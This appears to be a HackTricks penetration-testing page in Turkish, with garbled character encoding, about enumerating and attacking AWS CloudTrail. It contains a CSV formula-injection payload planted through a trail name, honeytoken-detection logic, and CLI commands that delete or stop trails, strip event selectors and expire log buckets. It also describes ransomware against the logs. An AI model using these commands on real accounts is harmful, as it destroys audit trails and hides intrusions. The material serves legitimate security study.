# AWS - CloudTrail Enum

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** **bizi takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}

## **CloudTrail**

AWS CloudTrail **AWS ortamÄ±nÄ±zdaki etkinlikleri kaydeder ve izler**. AWS kaynaklarÄ±yla yapÄ±lan tÃ¼m etkileÅŸimler iÃ§in kimin ne yaptÄ±ÄŸÄ±nÄ±, ne zaman ve nereden olduÄŸunu iÃ§eren ayrÄ±ntÄ±lÄ± **olay gÃ¼nlÃ¼klerini** yakalar. Bu, deÄŸiÅŸikliklerin ve eylemlerin bir denetim izini saÄŸlar, gÃ¼venlik analizi, uyum denetimi ve kaynak deÄŸiÅŸiklik takibi konusunda yardÄ±mcÄ± olur. CloudTrail, kullanÄ±cÄ± ve kaynak davranÄ±ÅŸÄ±nÄ± anlamak, gÃ¼venlik duruÅŸunu artÄ±rmak ve dÃ¼zenleyici uyumu saÄŸlamak iÃ§in gereklidir.

Her kaydedilen olay ÅŸunlarÄ± iÃ§erir:

* Ã‡aÄŸrÄ±lan API'nin adÄ±: `eventName`
* Ã‡aÄŸrÄ±lan hizmet: `eventSource`
* Zaman: `eventTime`
* IP adresi: `SourceIPAddress`
* Ajan yÃ¶ntemi: `userAgent`. Ã–rnekler:
* Signing.amazonaws.com - AWS YÃ¶netim Konsolu'ndan
* console.amazonaws.com - HesabÄ±n kÃ¶k kullanÄ±cÄ±sÄ±
* lambda.amazonaws.com - AWS Lambda
* Ä°stek parametreleri: `requestParameters`
* YanÄ±t Ã¶ÄŸeleri: `responseElements`

Olaylar, **yaklaÅŸÄ±k her 5 dakikada bir JSON dosyasÄ±nda** yeni bir gÃ¼nlÃ¼k dosyasÄ±na yazÄ±lÄ±r, CloudTrail tarafÄ±ndan tutulur ve nihayetinde gÃ¼nlÃ¼k dosyalarÄ± **yaklaÅŸÄ±k 15 dakika sonra S3'e teslim edilir**.\
CloudTrail gÃ¼nlÃ¼kleri **hesaplar ve bÃ¶lgeler arasÄ±nda birleÅŸtirilebilir.**\
CloudTrail, **gÃ¼nlÃ¼k dosyasÄ± bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kullanarak, gÃ¼nlÃ¼k dosyalarÄ±nÄ±zÄ±n CloudTrail tarafÄ±ndan size teslim edildiÄŸinden beri deÄŸiÅŸmediÄŸini doÄŸrulamanÄ±za olanak tanÄ±r.** Bir Ã¶zet dosyasÄ± iÃ§inde gÃ¼nlÃ¼klerin SHA-256 hash'ini oluÅŸturur. Yeni gÃ¼nlÃ¼klerin sha-256 hash'i her saat baÅŸÄ± oluÅŸturulur.\
Bir Trail oluÅŸtururken olay seÃ§icileri, kaydedilecek trail'i belirtmenize olanak tanÄ±r: YÃ¶netim, veri veya iÃ§gÃ¶rÃ¼ olaylarÄ±.

GÃ¼nlÃ¼kler bir S3 kovasÄ±nda saklanÄ±r. VarsayÄ±lan olarak Sunucu TarafÄ± Åifreleme (SSE-S3) kullanÄ±lÄ±r, bÃ¶ylece AWS, buna eriÅŸimi olan kiÅŸiler iÃ§in iÃ§eriÄŸi ÅŸifre Ã§Ã¶zer, ancak ek gÃ¼venlik iÃ§in KMS ile SSE ve kendi anahtarlarÄ±nÄ±zÄ± kullanabilirsiniz.

GÃ¼nlÃ¼kler, **bu ad formatÄ±na sahip bir S3 kovasÄ±nda saklanÄ±r**:

* **`BucketName/AWSLogs/AccountID/CloudTrail/RegionName/YYY/MM/DD`**
* BucketName: **`aws-cloudtrail-logs-<accountid>-<random>`**
* Ã–rnek: **`aws-cloudtrail-logs-947247140022-ffb95fe7/AWSLogs/947247140022/CloudTrail/ap-south-1/2023/02/22/`**

Her klasÃ¶r iÃ§inde her gÃ¼nlÃ¼k, **bu formatÄ± takip eden bir isme sahip olacaktÄ±r**: **`AccountID_CloudTrail_RegionName_YYYYMMDDTHHMMZ_Random.json.gz`**

GÃ¼nlÃ¼k DosyasÄ± Ä°simlendirme Konvansiyonu

![](<../../../../.gitbook/assets/image (122).png>)

AyrÄ±ca, **dosya bÃ¼tÃ¼nlÃ¼ÄŸÃ¼nÃ¼ kontrol etmek iÃ§in** **Ã¶zet dosyalarÄ±** **aynÄ± kovada** bulunacaktÄ±r:

![](<../../../../.gitbook/assets/image (195).png>)

### Birden Fazla Hesaptan GÃ¼nlÃ¼kleri BirleÅŸtirme

* GÃ¼nlÃ¼k dosyalarÄ±nÄ±n teslim edileceÄŸi AWS hesabÄ±nda bir Trail oluÅŸturun
* CloudTrail iÃ§in Ã§apraz hesap eriÅŸimine izin veren hedef S3 kovasÄ±na izinler uygulayÄ±n ve eriÅŸime ihtiyaÃ§ duyan her AWS hesabÄ±na izin verin
* DiÄŸer AWS hesaplarÄ±nda yeni bir Trail oluÅŸturun ve 1. adÄ±mda oluÅŸturulan kovayÄ± kullanmayÄ± seÃ§in

Ancak, tÃ¼m gÃ¼nlÃ¼kleri aynÄ± S3 kovasÄ±nda saklayabilseniz de, birden fazla hesaptan CloudTrail gÃ¼nlÃ¼klerini tek bir AWS hesabÄ±na ait CloudWatch Logs'a birleÅŸtiremezsiniz.

{% hint style="danger" %}
Bir hesabÄ±n, **farklÄ± Trails** ile CloudTrail **etkin** olabileceÄŸini ve aynÄ± (veya farklÄ±) gÃ¼nlÃ¼kleri farklÄ± kovalarda saklayabileceÄŸini unutmayÄ±n.
{% endhint %}

### TÃ¼m organizasyon hesaplarÄ±ndan 1'e CloudTrail

Bir CloudTrail oluÅŸtururken, organizasyondaki tÃ¼m hesaplar iÃ§in cloudtrail'i etkinleÅŸtirmek ve gÃ¼nlÃ¼kleri sadece 1 kovaya almak iÃ§in belirtmek mÃ¼mkÃ¼ndÃ¼r:

<figure><img src="../../../../.gitbook/assets/image (200).png" alt=""><figcaption></figcaption></figure>

Bu ÅŸekilde, tÃ¼m hesaplarÄ±n tÃ¼m bÃ¶lgelerinde CloudTrail'i kolayca yapÄ±landÄ±rabilir ve gÃ¼nlÃ¼kleri 1 hesapta (korumanÄ±z gereken) merkezileÅŸtirebilirsiniz.

### GÃ¼nlÃ¼k DosyalarÄ±nÄ± Kontrol Etme

GÃ¼nlÃ¼klerin deÄŸiÅŸtirilmediÄŸini kontrol etmek iÃ§in ÅŸunu Ã§alÄ±ÅŸtÄ±rabilirsiniz:

{% code overflow="wrap" %}
```javascript
aws cloudtrail validate-logs --trail-arn <trailARN> --start-time <start-time> [--end-time <end-time>] [--s3-bucket <bucket-name>] [--s3-prefix <prefix>] [--verbose]
```
{% endcode %}

### CloudWatch'a GÃ¼nlÃ¼kler

**CloudTrail, ÅŸÃ¼pheli aktiviteler gerÃ§ekleÅŸtirildiÄŸinde sizi uyaran uyarÄ±lar ayarlayabilmeniz iÃ§in gÃ¼nlÃ¼kleri otomatik olarak CloudWatch'a gÃ¶nderebilir.**\
CloudTrail'in gÃ¼nlÃ¼kleri CloudWatch'a gÃ¶ndermesine izin vermek iÃ§in bir **rol** oluÅŸturulmasÄ± gerektiÄŸini unutmayÄ±n. MÃ¼mkÃ¼nse, bu iÅŸlemleri gerÃ§ekleÅŸtirmek iÃ§in AWS varsayÄ±lan rolÃ¼nÃ¼n kullanÄ±lmasÄ± Ã¶nerilir. Bu rol, CloudTrail'in:

* CreateLogStream: CloudWatch Logs gÃ¼nlÃ¼k akÄ±ÅŸlarÄ± oluÅŸturmasÄ±na izin verir
* PutLogEvents: CloudTrail gÃ¼nlÃ¼klerini CloudWatch Logs gÃ¼nlÃ¼k akÄ±ÅŸÄ±na iletmesine izin verir

### Olay GeÃ§miÅŸi

CloudTrail Olay GeÃ§miÅŸi, kaydedilen gÃ¼nlÃ¼kleri bir tabloda incelemenizi saÄŸlar:

![](<../../../../.gitbook/assets/image (89).png>)

### Ä°Ã§gÃ¶rÃ¼ler

**CloudTrail Ä°Ã§gÃ¶rÃ¼leri**, CloudTrail izlerinden yazma yÃ¶netim olaylarÄ±nÄ± otomatik olarak **analiz eder** ve **olaÄŸandÄ±ÅŸÄ± aktiviteler** hakkÄ±nda sizi **uyarÄ±r**. Ã–rneÄŸin, belirlenen temel deÄŸerlerden farklÄ± olarak `TerminateInstance` olaylarÄ±nda bir artÄ±ÅŸ varsa, bunu bir Ä°Ã§gÃ¶rÃ¼ olayÄ± olarak gÃ¶receksiniz. Bu olaylar, **olaÄŸandÄ±ÅŸÄ± API aktivitelerini bulmayÄ± ve yanÄ±t vermeyi her zamankinden daha kolay hale getirir**.

Ä°Ã§gÃ¶rÃ¼ler, CloudTrail gÃ¼nlÃ¼kleriyle aynÄ± kovada saklanÄ±r: `BucketName/AWSLogs/AccountID/CloudTrail-Insight`

### GÃ¼venlik

| CloudTrail GÃ¼nlÃ¼k DosyasÄ± BÃ¼tÃ¼nlÃ¼ÄŸÃ¼ | <ul><li>GÃ¼nlÃ¼klerin deÄŸiÅŸtirilip deÄŸiÅŸtirilmediÄŸini (deÄŸiÅŸtirilmiÅŸ veya silinmiÅŸ) doÄŸrulayÄ±n</li><li><p>Her dosya iÃ§in hash oluÅŸturmak iÃ§in Ã¶zet dosyalarÄ± kullanÄ±r</p><ul><li>SHA-256 hashing</li><li>SHA-256 ile dijital imzalama iÃ§in RSA</li><li>Amazon'a ait Ã¶zel anahtar</li></ul></li><li>Bir Ã¶zet dosyasÄ± oluÅŸturmak 1 saat sÃ¼rer (her saat baÅŸÄ±nda yapÄ±lÄ±r)</li></ul> |
| ------------------------------------ | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Yetkisiz eriÅŸimi durdurun           | <ul><li><p>IAM politikalarÄ± ve S3 kova politikalarÄ± kullanÄ±n</p><ul><li>gÃ¼venlik ekibi â€”> yÃ¶netici eriÅŸimi</li><li>denetÃ§iler â€”> yalnÄ±zca okuma eriÅŸimi</li></ul></li><li>GÃ¼nlÃ¼kleri ÅŸifrelemek iÃ§in SSE-S3/SSE-KMS kullanÄ±n</li></ul>                                                                                                                                        |
| GÃ¼nlÃ¼k dosyalarÄ±nÄ±n silinmesini Ã¶nleyin | <ul><li>IAM ve kova politikalarÄ± ile silme eriÅŸimini kÄ±sÄ±tlayÄ±n</li><li>S3 MFA silme yapÄ±landÄ±rmasÄ± yapÄ±n</li><li>GÃ¼nlÃ¼k DosyasÄ± DoÄŸrulamasÄ± ile doÄŸrulayÄ±n</li></ul>                                                                                                                                                                                            |

## EriÅŸim DanÄ±ÅŸmanÄ±

AWS EriÅŸim DanÄ±ÅŸmanÄ±, iÃ§gÃ¶rÃ¼lerini toplamak iÃ§in son 400 gÃ¼nÃ¼n AWS **CloudTrail gÃ¼nlÃ¼klerine dayanÄ±r**. CloudTrail, bir AWS hesabÄ±nda yapÄ±lan AWS API Ã§aÄŸrÄ±larÄ±nÄ±n ve ilgili olaylarÄ±n tarihini kaydeder. EriÅŸim DanÄ±ÅŸmanÄ±, bu verileri kullanarak **hizmetlerin en son ne zaman eriÅŸildiÄŸini gÃ¶sterir**. CloudTrail gÃ¼nlÃ¼klerini analiz ederek, EriÅŸim DanÄ±ÅŸmanÄ± bir IAM kullanÄ±cÄ±sÄ±nÄ±n veya rolÃ¼nÃ¼n hangi AWS hizmetlerine eriÅŸtiÄŸini ve bu eriÅŸimin ne zaman gerÃ§ekleÅŸtiÄŸini belirleyebilir. Bu, AWS yÃ¶neticilerinin **izinleri iyileÅŸtirme** konusunda bilinÃ§li kararlar almasÄ±na yardÄ±mcÄ± olur; Ã§Ã¼nkÃ¼ uzun sÃ¼re eriÅŸilmeyen hizmetleri tanÄ±mlayabilir ve gerÃ§ek kullanÄ±m kalÄ±plarÄ±na dayalÄ± olarak aÅŸÄ±rÄ± geniÅŸ izinleri potansiyel olarak azaltabilir.

{% hint style="success" %}
Bu nedenle, EriÅŸim DanÄ±ÅŸmanÄ±, kullanÄ±cÄ±lara verilen **gereksiz izinler hakkÄ±nda bilgi verir** bÃ¶ylece yÃ¶netici bunlarÄ± kaldÄ±rabilir
{% endhint %}

<figure><img src="../../../../.gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

## Eylemler

### Enumerasyon
```bash
# Get trails info
aws cloudtrail list-trails
aws cloudtrail describe-trails
aws cloudtrail list-public-keys
aws cloudtrail get-event-selectors --trail-name <trail_name>
aws [--region us-east-1] cloudtrail get-trail-status --name [default]

# Get insights
aws cloudtrail get-insight-selectors --trail-name <trail_name>

# Get data store info
aws cloudtrail list-event-data-stores
aws cloudtrail list-queries --event-data-store <data-source>
aws cloudtrail get-query-results --event-data-store <data-source> --query-id <id>
```
### **CSV Injection**

CloudTrail iÃ§inde, gÃ¼nlÃ¼kler CSV formatÄ±nda dÄ±ÅŸa aktarÄ±ldÄ±ÄŸÄ±nda ve Excel ile aÃ§Ä±ldÄ±ÄŸÄ±nda rastgele kodu Ã§alÄ±ÅŸtÄ±racak bir CVS enjeksiyonu gerÃ§ekleÅŸtirmek mÃ¼mkÃ¼ndÃ¼r.\
AÅŸaÄŸÄ±daki kod, yÃ¼kÃ¼ iÃ§eren kÃ¶tÃ¼ bir Trail adÄ±yla gÃ¼nlÃ¼k giriÅŸi oluÅŸturacaktÄ±r:
```python
import boto3
payload = "=cmd|'/C calc'|''"
client = boto3.client('cloudtrail')
response = client.create_trail(
Name=payload,
S3BucketName="random"
)
print(response)
```
Daha fazla bilgi iÃ§in CSV EnjeksiyonlarÄ± hakkÄ±nda sayfayÄ± kontrol edin:

{% embed url="https://book.hacktricks.xyz/pentesting-web/formula-injection" %}

Bu spesifik teknik hakkÄ±nda daha fazla bilgi iÃ§in [https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/](https://rhinosecuritylabs.com/aws/cloud-security-csv-injection-aws-cloudtrail/) adresini kontrol edin.

## **AlgÄ±lama Atlatma**

### HoneyTokens **atlatma**

Honeytoken'lar **hassas bilgilerin sÄ±zdÄ±rÄ±lmasÄ±nÄ± tespit etmek iÃ§in** oluÅŸturulmuÅŸtur. AWS durumunda, bunlar **kullanÄ±mÄ± izlenen AWS anahtarlarÄ±dÄ±r**, eÄŸer bu anahtarla bir eylem tetiklenirse, o zaman birisi bu anahtarÄ± Ã§almÄ±ÅŸ olmalÄ±dÄ±r.

Ancak, [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren) tarafÄ±ndan oluÅŸturulan Honeytoken'lar ya tanÄ±nabilir hesap adÄ± kullanÄ±yor ya da tÃ¼m mÃ¼ÅŸterileri iÃ§in aynÄ± AWS hesap kimliÄŸini kullanÄ±yor. Bu nedenle, eÄŸer Cloudtrail herhangi bir gÃ¼nlÃ¼k oluÅŸturmadan hesap adÄ±nÄ± ve/veya hesap kimliÄŸini alabilirseniz, **anahtarÄ±n bir honeytoken olup olmadÄ±ÄŸÄ±nÄ± bilebilirsiniz**.

[**Pacu**](https://github.com/RhinoSecurityLabs/pacu/blob/79cd7d58f7bff5693c6ae73b30a8455df6136cca/pacu/modules/iam__detect_honeytokens/main.py#L57) bazÄ± kurallara sahiptir, bir anahtarÄ±n [**Canarytokens**](https://canarytokens.org/generate)**,** [**SpaceCrab**](https://bitbucket.org/asecurityteam/spacecrab/issues?status=new\&status=open)**,** [**SpaceSiren**](https://github.com/spacesiren/spacesiren)**'e ait olup olmadÄ±ÄŸÄ±nÄ± tespit etmek iÃ§in:**

* EÄŸer **`canarytokens.org`** rol adÄ±nda gÃ¶rÃ¼nÃ¼yorsa veya hesap kimliÄŸi **`534261010715`** hata mesajÄ±nda gÃ¶rÃ¼nÃ¼yorsa.
* Daha yakÄ±n zamanda test ettiÄŸimizde, **`717712589309`** hesabÄ±nÄ± kullanÄ±yorlar ve hala adÄ±nda **`canarytokens.com`** dizesi var.
* EÄŸer **`SpaceCrab`** hata mesajÄ±nda rol adÄ±nda gÃ¶rÃ¼nÃ¼yorsa.
* **SpaceSiren**, kullanÄ±cÄ± adlarÄ± oluÅŸturmak iÃ§in **uuids** kullanÄ±r: `[a-f0-9]{8}-[a-f0-9]{4}-4[a-f0-9]{3}-[89aAbB][a-f0-9]{3}-[a-f0-9]{12}`
* EÄŸer **isim rastgele Ã¼retilmiÅŸ gibi gÃ¶rÃ¼nÃ¼yorsa**, bunun bir HoneyToken olma olasÄ±lÄ±ÄŸÄ± yÃ¼ksektir.

#### Anahtar KimliÄŸinden Hesap KimliÄŸini Almak

**EriÅŸim anahtarÄ±nÄ±n** iÃ§inde **kodlanmÄ±ÅŸ** olarak **Hesap KimliÄŸini** alabilirsiniz, [**burada aÃ§Ä±klandÄ±ÄŸÄ± gibi**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489) ve hesap kimliÄŸini Honeytoken AWS hesaplarÄ±nÄ±zÄ±n listesiyle kontrol edebilirsiniz:
```python
import base64
import binascii

def AWSAccount_from_AWSKeyID(AWSKeyID):

trimmed_AWSKeyID = AWSKeyID[4:] #remove KeyID prefix
x = base64.b32decode(trimmed_AWSKeyID) #base32 decode
y = x[0:6]

z = int.from_bytes(y, byteorder='big', signed=False)
mask = int.from_bytes(binascii.unhexlify(b'7fffffffff80'), byteorder='big', signed=False)

e = (z & mask)>>7
return (e)

print("account id:" + "{:012d}".format(AWSAccount_from_AWSKeyID("ASIAQNZGKIQY56JQ7WML")))
```
Check more information in the [**orginal research**](https://medium.com/@TalBeerySec/a-short-note-on-aws-key-id-f88cc4317489).

#### Log oluÅŸturma

Bunun iÃ§in en etkili teknik aslÄ±nda basit bir tekniktir. BulduÄŸunuz anahtarÄ± kullanarak kendi saldÄ±rgan hesabÄ±nÄ±zdaki bir hizmete eriÅŸin. Bu, **CloudTrail'in KENDÄ° AWS hesabÄ±nÄ±zda bir log oluÅŸturmasÄ±nÄ± saÄŸlar ve kurbanÄ±n hesabÄ±nda deÄŸil**.

Sorun ÅŸu ki, Ã§Ä±ktÄ± size hesap kimliÄŸi ve hesap adÄ± belirten bir hata gÃ¶sterecektir, bÃ¶ylece **Honeytoken olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rebilirsiniz**.

#### Log gÃ¶ndermeyen AWS hizmetleri

GeÃ§miÅŸte bazÄ± **AWS hizmetleri CloudTrail'e log gÃ¶ndermiyordu** (buradan [bir liste bulabilirsiniz](https://docs.aws.amazon.com/awscloudtrail/latest/userguide/cloudtrail-unsupported-aws-services.html)). Bu hizmetlerden bazÄ±larÄ±, yetkisiz (honeytoken anahtarÄ±) birinin eriÅŸmeye Ã§alÄ±ÅŸmasÄ± durumunda **anahtar rolÃ¼nÃ¼n ARN'sini** iÃ§eren bir **hata** ile **yanÄ±t verecektir**.

Bu ÅŸekilde, bir **saldÄ±rgan herhangi bir log tetiklemeksizin anahtarÄ±n ARN'sini elde edebilir**. ARN'de saldÄ±rgan **AWS hesap kimliÄŸini ve adÄ±nÄ±** gÃ¶rebilir, bu nedenle HoneyToken'Ä±n ÅŸirket hesap kimliklerini ve adlarÄ±nÄ± bilmek kolaydÄ±r, bu ÅŸekilde bir saldÄ±rgan token'Ä±n HoneyToken olup olmadÄ±ÄŸÄ±nÄ± belirleyebilir.

![](<../../../../.gitbook/assets/image (93).png>)

{% hint style="danger" %}
CloudTrail loglarÄ± oluÅŸturmayan tÃ¼m kamu API'lerinin artÄ±k dÃ¼zeltildiÄŸini unutmayÄ±n, bu nedenle belki kendi Ã§Ã¶zÃ¼mÃ¼nÃ¼zÃ¼ bulmanÄ±z gerekebilir...

Daha fazla bilgi iÃ§in [**orijinal araÅŸtÄ±rmaya**](https://rhinosecuritylabs.com/aws/aws-iam-enumeration-2-0-bypassing-cloudtrail-logging/) bakÄ±n.
{% endhint %}

### ÃœÃ§Ã¼ncÃ¼ AltyapÄ±ya EriÅŸim

Belirli AWS hizmetleri **veritabanlarÄ±** veya **Kubernetes** kÃ¼meleri (EKS) gibi **bazÄ± altyapÄ±lar oluÅŸturacaktÄ±r**. Bir kullanÄ±cÄ±, bu hizmetlere (Kubernetes API'si gibi) **doÄŸrudan konuÅŸtuÄŸunda** **AWS API'sini kullanmayacaktÄ±r**, bu nedenle CloudTrail bu iletiÅŸimi gÃ¶remeyecektir.

Bu nedenle, EKS'ye eriÅŸimi olan bir kullanÄ±cÄ±, EKS API'sinin URL'sini keÅŸfettiyse, yerel olarak bir token oluÅŸturabilir ve **Cloudtrail tarafÄ±ndan tespit edilmeden API hizmetiyle doÄŸrudan konuÅŸabilir**.

Daha fazla bilgi iÃ§in:

{% content-ref url="../../aws-post-exploitation/aws-eks-post-exploitation.md" %}
[aws-eks-post-exploitation.md](../../aws-post-exploitation/aws-eks-post-exploitation.md)
{% endcontent-ref %}

### CloudTrail YapÄ±landÄ±rmasÄ±nÄ± DeÄŸiÅŸtirme

#### Ä°zleri sil
```bash
aws cloudtrail delete-trail --name [trail-name]
```
#### Ä°zleri Durdur
```bash
aws cloudtrail stop-logging --name [trail-name]
```
#### Ã‡ok bÃ¶lgeli gÃ¼nlÃ¼ÄŸÃ¼ devre dÄ±ÅŸÄ± bÄ±rak

{% code overflow="wrap" %}
```bash
aws cloudtrail update-trail --name [trail-name] --no-is-multi-region --no-include-global-services
```
#### Olay SeÃ§icileri ile GÃ¼nlÃ¼ÄŸÃ¼ Devre DÄ±ÅŸÄ± BÄ±rakma

{% code overflow="wrap" %}
```bash
# Leave only the ReadOnly selector
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[{"ReadWriteType": "ReadOnly"}]' --region <region>

# Remove all selectors (stop Insights)
aws cloudtrail put-event-selectors --trail-name <trail_name> --event-selectors '[]' --region <region>
```
{% endcode %}

Ä°lk Ã¶rnekte, tek bir olay seÃ§ici, tek bir nesne ile JSON dizisi olarak saÄŸlanmÄ±ÅŸtÄ±r. `"ReadWriteType": "ReadOnly"` ifadesi, **olay seÃ§icinin yalnÄ±zca salt okunur olaylarÄ± yakalamasÄ± gerektiÄŸini** belirtir (bu nedenle CloudTrail iÃ§gÃ¶rÃ¼leri **Ã¶rneÄŸin yazma** olaylarÄ±nÄ± kontrol etmeyecek).

Olay seÃ§iciyi belirli gereksinimlerinize gÃ¶re Ã¶zelleÅŸtirebilirsiniz.

#### S3 yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± ile gÃ¼nlÃ¼k silme

{% code overflow="wrap" %}
```bash
aws s3api put-bucket-lifecycle --bucket <bucket_name> --lifecycle-configuration '{"Rules": [{"Status": "Enabled", "Prefix": "", "Expiration": {"Days": 7}}]}' --region <region>
```
{% endcode %}

### Bucket KonfigÃ¼rasyonunu DeÄŸiÅŸtirme

* S3 bucket'Ä±nÄ± sil
* CloudTrail hizmetinden gelen yazmalarÄ± reddetmek iÃ§in bucket politikasÄ±nÄ± deÄŸiÅŸtir
* S3 bucket'Ä±na nesneleri silmek iÃ§in yaÅŸam dÃ¶ngÃ¼sÃ¼ politikasÄ± ekle
* CloudTrail gÃ¼nlÃ¼klerini ÅŸifrelemek iÃ§in kullanÄ±lan kms anahtarÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rak

### Cloudtrail ransomware

#### S3 ransomware

**Asimetrik bir anahtar** oluÅŸturabilir ve **CloudTrail'in verileri** o anahtar ile ÅŸifrelemesini saÄŸlayabilir ve **Ã¶zel anahtarÄ±** silerek CloudTrail iÃ§eriÄŸinin kurtarÄ±lamayacaÄŸÄ±nÄ± garanti edebilirsin.\
Bu temelde **S3-KMS ransomware** olarak aÃ§Ä±klanmÄ±ÅŸtÄ±r:

{% content-ref url="../../aws-post-exploitation/aws-s3-post-exploitation.md" %}
[aws-s3-post-exploitation.md](../../aws-post-exploitation/aws-s3-post-exploitation.md)
{% endcontent-ref %}

**KMS ransomware**

Bu, Ã¶nceki saldÄ±rÄ±yÄ± farklÄ± izin gereksinimleri ile gerÃ§ekleÅŸtirmenin en kolay yoludur:

{% content-ref url="../../aws-post-exploitation/aws-kms-post-exploitation.md" %}
[aws-kms-post-exploitation.md](../../aws-post-exploitation/aws-kms-post-exploitation.md)
{% endcontent-ref %}

## **Referanslar**

* [https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory](https://cloudsecdocs.com/aws/services/logging/cloudtrail/#inventory)

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../../.gitbook/assets/image (1) (1) (1).png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** bizi **takip edin** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
